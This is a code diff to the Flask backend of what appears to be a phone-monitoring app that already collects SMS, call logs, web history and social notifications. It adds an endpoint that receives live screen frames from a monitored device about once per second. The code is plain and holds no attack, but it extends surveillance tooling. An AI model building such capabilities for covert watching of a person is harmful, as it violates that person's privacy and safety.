@@ -25,7 +25,7 @@ from ..extensions import (
 from ..models import (
     Device, LocationReport, ActivityReport, BatteryReport, ScreenTimeReport,
     SmsMessage, CallLog, CallStateEvent, InstalledApp, MediaFile, WebHistory,
-    Geofence, GeofenceEvent, SocialNotification, RemoteCommand,
+    Geofence, GeofenceEvent, SocialNotification, RemoteCommand, ScreenFrame,
 )
 from ..security import (
     assert_device_ownership, assert_command_ownership, audit_log,
@@ -840,6 +840,38 @@ def report_bulk():
 
 
 # ─── Real-time call state + audio streaming ──────────────────────────────
+
+@bp.route('/report/screen-frame', methods=['POST'])
+@jwt_required()
+def report_screen_frame():
+    """Live screen-view frame (Live Screen viewer). Upserts the single row per
+    device so ~1 fps streaming can never grow the database."""
+    caller_id = get_jwt_identity()
+    data = request.get_json(silent=True) or {}
+    ok, canonical = assert_device_ownership(data.get('device_id'), caller_id)
+    if not ok:
+        return jsonify({'error': 'Access denied'}), 403
+
+    b64 = data.get('image') or ''
+    if not b64:
+        return jsonify({'error': 'image required'}), 400
+    try:
+        raw = _b64.b64decode(b64)
+    except Exception:
+        return jsonify({'error': 'invalid image data'}), 400
+    if len(raw) > 512 * 1024:
+        return jsonify({'error': 'frame too large'}), 413
+
+    row = ScreenFrame.query.filter_by(device_id=canonical).first()
+    if row is None:
+        row = ScreenFrame(device_id=canonical)
+        db.session.add(row)
+    row.image = raw
+    row.ts = int(data.get('timestamp') or _now_ms())
+    row.received_at = _now_ms()
+    db.session.commit()
+    return jsonify({'status': 'ok'})
+
 
 @bp.route('/report/call-state', methods=['POST'])
 @jwt_required()
